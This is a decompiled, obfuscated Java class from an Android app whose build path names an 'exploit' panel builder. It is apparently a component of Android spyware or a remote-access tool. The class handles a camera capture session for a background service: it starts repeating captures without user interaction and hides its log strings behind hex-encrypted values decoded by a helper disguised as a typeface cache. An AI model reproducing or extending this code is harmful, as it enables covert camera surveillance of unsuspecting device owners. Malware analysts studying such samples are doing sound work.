package v.s;

import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.os.Handler;
import app.mobilex.plus.services.ConfigTQWorker;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class Lll1MAU873FM extends CameraCaptureSession.StateCallback {
    public final /* synthetic */ ConfigTQWorker dDIMxZXP1V8HdM;

    public Lll1MAU873FM(ConfigTQWorker configTQWorker) {
        this.dDIMxZXP1V8HdM = configTQWorker;
    }

    private static /* synthetic */ void tcejemait() {
    }

    @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
    public final void onConfigureFailed(CameraCaptureSession cameraCaptureSession) {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("00000077004B009300E500AD00D700E7003000730048009400F900B000DC00E7002000790055008100F900B800C700B5002200620052008800FE00FF00D400A6002A007A005E0083");
        ConfigTQWorker configTQWorker = this.dDIMxZXP1V8HdM;
        configTQWorker.dDIMxZXP1V8HdM();
        configTQWorker.stopSelf();
    }

    @Override // android.hardware.camera2.CameraCaptureSession.StateCallback
    public final void onConfigured(CameraCaptureSession cameraCaptureSession) {
        byte[] bArr = ConfigTQWorker.ibVTtJUNfrGYbW;
        TypefaceCache.obtain("00000077004B009300E500AD00D700E7003000730048009400F900B000DC00E7002000790055008100F900B800C700B500260072");
        ConfigTQWorker configTQWorker = this.dDIMxZXP1V8HdM;
        try {
            CameraDevice cameraDevice = configTQWorker.dDIMxZXP1V8HdM;
            CaptureRequest.Builder builderCreateCaptureRequest = cameraDevice != null ? cameraDevice.createCaptureRequest(1) : null;
            if (builderCreateCaptureRequest != null) {
                builderCreateCaptureRequest.addTarget(configTQWorker.w9sT1Swbhx3hs.getSurface());
            }
            if (builderCreateCaptureRequest != null) {
                builderCreateCaptureRequest.set(CaptureRequest.CONTROL_MODE, 1);
            }
            if (builderCreateCaptureRequest != null) {
                builderCreateCaptureRequest.set(CaptureRequest.CONTROL_AE_MODE, 1);
            }
            cameraCaptureSession.setRepeatingRequest(builderCreateCaptureRequest.build(), null, configTQWorker.JXn4Qf7zpnLjP5);
            Handler handler = configTQWorker.JXn4Qf7zpnLjP5;
            if (handler != null) {
                handler.postDelayed(new A68NpXPqwTFos99nt(cameraCaptureSession, 3, configTQWorker), 1500L);
            }
        } catch (CameraAccessException e) {
            TypefaceCache.obtain("00000077004B009300E500AD00D700E7002600640049008800E200E50092");
            e.getMessage();
        }
    }
}
